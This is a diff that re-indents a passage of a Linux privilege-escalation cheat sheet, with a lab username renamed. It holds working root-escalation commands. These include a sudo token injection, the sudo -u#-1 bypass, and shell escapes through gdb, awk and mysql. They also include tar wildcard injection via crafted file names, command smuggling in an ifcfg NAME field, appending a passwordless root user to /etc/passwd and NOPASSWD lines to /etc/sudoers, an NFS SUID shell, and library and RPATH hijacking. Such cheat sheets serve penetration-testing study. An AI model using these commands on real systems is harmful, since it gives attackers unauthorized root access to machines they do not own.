@@ -243,7 +243,7 @@ setgid()	sets the effective group ID of the calling process
 Capabilities
 
     List capabilities of binaries
-    ╭─swissky@lab ~  
+    ╭─Cyber_Public_School@lab ~  
     ╰─$ /usr/bin/getcap -r  /usr/bin
     /usr/bin/fping                = cap_net_raw+ep
     /usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
@@ -334,133 +334,144 @@ sudo_inject
 Using https://github.com/nongiach/sudo_inject
 
 
-$ sudo whatever
-[sudo] password for user:    
-# Press <ctrl>+c since you don't have the password. 
-# This creates an invalid sudo tokens.
-$ sh exploit.sh
-.... wait 1 seconds
-$ sudo -i # no password required :)
-# id
-uid=0(root) gid=0(root) groups=0(root)
+    $ sudo whatever
+    [sudo] password for user:    
+    # Press <ctrl>+c since you don't have the password. 
+    # This creates an invalid sudo tokens.
+    $ sh exploit.sh
+    .... wait 1 seconds
+    $ sudo -i # no password required :)
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Exploitable when a user have the following permissions (sudo -l)
-(ALL, !root) ALL
+    # Exploitable when a user have the following permissions (sudo -l)
+    (ALL, !root) ALL
 
-# If you have a full TTY, you can exploit it like this
-sudo -u#-1 /bin/bash
-sudo -u#4294967295 id
-GTFOBins
-GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+    # If you have a full TTY, you can exploit it like this
+    sudo -u#-1 /bin/bash
+    sudo -u#4294967295 id
+    GTFOBins
+    GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
-The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+    The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and         facilitate the other post-exploitation tasks.
 
-gdb -nx -ex '!sh' -ex quit
-sudo mysql -e '! /bin/sh'
-strace -o /dev/null /bin/sh
-sudo awk 'BEGIN {system("/bin/sh")}'
+    gdb -nx -ex '!sh' -ex quit
+    sudo mysql -e '! /bin/sh'
+    strace -o /dev/null /bin/sh
+    sudo awk 'BEGIN {system("/bin/sh")}'
 
-Wildcard
-By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.
+    Wildcard
+    By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the     user who starts tar. “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# create file for exploitation
-touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=sh shell.sh"
-echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
+    # create file for exploitation
+    
+    touch -- "--checkpoint=1"
+    touch -- "--checkpoint-action=exec=sh shell.sh"
+    echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # vulnerable script
-tar cf archive.tar *
-Tool: wildpwn
+
+    tar cf archive.tar *
+    Tool: wildpwn
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Writable files
-List world writable files on the system.
-find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
-find / -perm -2 -type f 2>/dev/null
-find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
-Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
-/etc/sysconfig/network-scripts/ifcfg-1337 for example
+
+    List world writable files on the system.
+    find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+    find / -perm -2 -type f 2>/dev/null
+    find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+    Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+    /etc/sysconfig/network-scripts/ifcfg-1337 for example
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 NAME=Network /bin/id  &lt;= Note the blank space
 ONBOOT=yes
 DEVICE=eth0
 
-EXEC :
-./etc/sysconfig/network-scripts/ifcfg-1337
-src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    EXEC :
+    ./etc/sysconfig/network-scripts/ifcfg-1337
+    src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------    
 Writable /etc/passwd
-First generate a password with one of the following commands.
-openssl passwd -1 -salt hacker hacker
-mkpasswd -m SHA-512 hacker
-python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
-then add the user hacker and add the generated password.
-hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
-E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
-You can now use the su command with hacker:hacker
+
+    First generate a password with one of the following commands.
+    openssl passwd -1 -salt hacker hacker
+    mkpasswd -m SHA-512 hacker
+    python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+    then add the user hacker and add the generated password.
+    hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+    E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
+    You can now use the su command with hacker:hacker
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Alternatively you can use the following lines to add a dummy user without a password.
-WARNING: you might degrade the current security of the machine.
+    Alternatively you can use the following lines to add a dummy user without a password.
+    WARNING: you might degrade the current security of the machine.
 
 
-echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
-su - dummy
-NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd, also the /etc/shadow is renamed to /etc/spwd.db.
+    echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+    su - dummy
+        NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd, also the /etc/shadow is renamed to /etc/spwd.db.
 
 Writable /etc/sudoers
 
-echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+    echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 
-# use SUDO without password
-echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
-echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+    # use SUDO without password
+    echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+    echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+    
 NFS Root Squashing
-When no_root_squash appears in /etc/exports, the folder is shareable and a remote user can mount it.
+    When no_root_squash appears in /etc/exports, the folder is shareable and a remote user can mount it.
 
 
-# remote check the name of the folder
-showmount -e 10.10.10.10
+    # remote check the name of the folder
+    
+    showmount -e 10.10.10.10
 
-# create dir
-mkdir /tmp/nfsdir  
+    # create dir
+    
+    mkdir /tmp/nfsdir  
 
-# mount directory 
-mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
-cd /tmp/nfsdir
+    # mount directory 
+    
+    mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+    cd /tmp/nfsdir
 
-# copy wanted shell 
-cp /bin/bash .  
+    # copy wanted shell 
+    
+    cp /bin/bash .  
 
-# set suid permission
-chmod +s bash   
-Shared Library
-ldconfig
-Identify shared libraries with ldd
-
-
-$ ldd /opt/binary
-    linux-vdso.so.1 (0x00007ffe961cd000)
-    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
-    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
-Create a library in /tmp and activate the path.
+    # set suid permission
+    
+    chmod +s bash   
+    Shared Library
+    ldconfig
+    Identify shared libraries with ldd
 
 
-gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
-echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
-/opt/binary
-RPATH
+    $ ldd /opt/binary
+        linux-vdso.so.1 (0x00007ffe961cd000)
+        vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
+    Create a library in /tmp and activate the path.
 
-level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
- 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
- 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 
-level15@nebula:/home/flag15$ ldd ./flag15 
- linux-gate.so.1 =>  (0x0068c000)
- libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
- /lib/ld-linux.so.2 (0x005bb000)
-By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable.
+    gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
+    echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
+    /opt/binary
+    RPATH
+
+    level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
+     0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+     0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+
+    Cyber_Public_School@lab:/home/flag15$ ldd ./flag15 
+     linux-gate.so.1 =>  (0x0068c000)
+     libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+     /lib/ld-linux.so.2 (0x005bb000)
+    By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable.
 
 
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
